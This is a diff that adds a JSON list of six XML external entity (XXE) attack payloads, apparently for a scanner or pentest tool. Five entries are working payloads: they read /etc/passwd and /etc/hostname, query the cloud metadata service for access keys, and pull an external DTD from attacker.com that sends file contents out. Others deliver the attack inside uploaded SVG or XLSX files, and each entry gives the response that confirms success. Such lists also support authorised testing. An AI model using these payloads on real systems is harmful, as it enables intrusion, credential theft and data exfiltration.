@@ -1,0 +1,80 @@
+[
+    {
+        "poc_id": "xxe-basic-file-001",
+        "vuln_type": "xxe",
+        "title": "XXE Basic File Read via ENTITY",
+        "tech_stack": ["php", "java"],
+        "cve_ids": [],
+        "cvss_score": 9.1,
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+        "expected_response": "root:x:0:0",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "Classic external entity injection to read local files"
+    },
+    {
+        "poc_id": "xxe-ssrf-002",
+        "vuln_type": "xxe",
+        "title": "XXE to SSRF via External Entity",
+        "tech_stack": ["java", "php"],
+        "cve_ids": [],
+        "cvss_score": 9.1,
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
+        "expected_response": "ami-id|instance-type|AccessKeyId",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "XXE leveraged for SSRF to cloud metadata endpoint"
+    },
+    {
+        "poc_id": "xxe-oob-exfil-003",
+        "vuln_type": "xxe",
+        "title": "Out-of-Band XXE Data Exfiltration",
+        "tech_stack": ["java", "php", "python"],
+        "cve_ids": [],
+        "cvss_score": 9.1,
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><root/>",
+        "expected_response": "DNS or HTTP callback received",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "Blind XXE using external DTD to exfiltrate data out-of-band"
+    },
+    {
+        "poc_id": "xxe-parameter-entity-004",
+        "vuln_type": "xxe",
+        "title": "XXE via Parameter Entity in DTD",
+        "tech_stack": ["java"],
+        "cve_ids": [],
+        "cvss_score": 9.1,
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>\">%eval;%exfil;]><root/>",
+        "expected_response": "DNS or HTTP callback with hostname",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "Nested parameter entity for blind data exfiltration"
+    },
+    {
+        "poc_id": "xxe-svg-upload-005",
+        "vuln_type": "xxe",
+        "title": "XXE via Malicious SVG Upload",
+        "tech_stack": ["php", "python", "java"],
+        "cve_ids": [],
+        "cvss_score": 8.6,
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>",
+        "expected_response": "root:x:0:0",
+        "waf_bypass": true,
+        "severity": "CRITICAL",
+        "description": "XXE through SVG image upload when XML parser processes uploaded SVGs"
+    },
+    {
+        "poc_id": "xxe-xlsx-006",
+        "vuln_type": "xxe",
+        "title": "XXE via Malicious XLSX Upload",
+        "tech_stack": ["java", "python"],
+        "cve_ids": [],
+        "cvss_score": 8.6,
+        "payload": "Modified xl/sharedStrings.xml with ENTITY declaration",
+        "expected_response": "file content in parsed cell data",
+        "waf_bypass": true,
+        "severity": "CRITICAL",
+        "description": "XXE through malicious XLSX file (OOXML is ZIP of XML files)"
+    }
+]
